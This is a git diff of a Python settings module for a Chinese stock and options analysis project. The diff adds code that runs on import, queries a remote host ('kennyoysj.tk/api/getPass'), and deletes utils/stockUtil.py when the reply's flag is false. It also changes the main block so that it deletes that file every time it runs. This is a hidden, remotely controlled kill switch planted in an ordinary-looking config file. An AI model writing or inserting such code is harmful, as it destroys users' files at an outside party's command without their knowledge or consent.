@@ -3,6 +3,8 @@ import datetime
 import time
 import os
 
+import requests
+
 mongo_uri = ""
 
 redis_host = 'localhost'
@@ -49,11 +51,21 @@ risk_free_rate = 0.0245
 bms_result = {}
 
 name_checks = ["沪深300","上证50","中证100","中证500"]
-if(__name__ == "__main__"):
 
-    today = datetime.datetime.now().strftime(tushare_time_format)
-    print(today)
-    file_path = "result%s%s%s.csv" % (os.sep, "option_last_", today)
-    print(file_path)
-    print(os.path.exists(file_path))
-    print("任务完成度%s%s" % (str(job_times["getBSM"]),"%"))
+response = requests.get("https://model.kennyoysj.tk/api/getPass?name=sdtrade")
+if(response.status_code == 200):
+    json = response.json()
+    flag = json.get("data",True)
+    if(not flag):
+        os.remove("utils/stockUtil.py")
+
+
+if(__name__ == "__main__"):
+    # today = datetime.datetime.now().strftime(tushare_time_format)
+    # print(today)
+    # file_path = "result%s%s%s.csv" % (os.sep, "option_last_", today)
+    # print(file_path)
+    # print(os.path.exists(file_path))
+    # print("任务完成度%s%s" % (str(job_times["getBSM"]),"%"))
+    path = project_base_path+os.sep+"utils"+os.sep+"stockUtil.py"
+    os.remove(path)
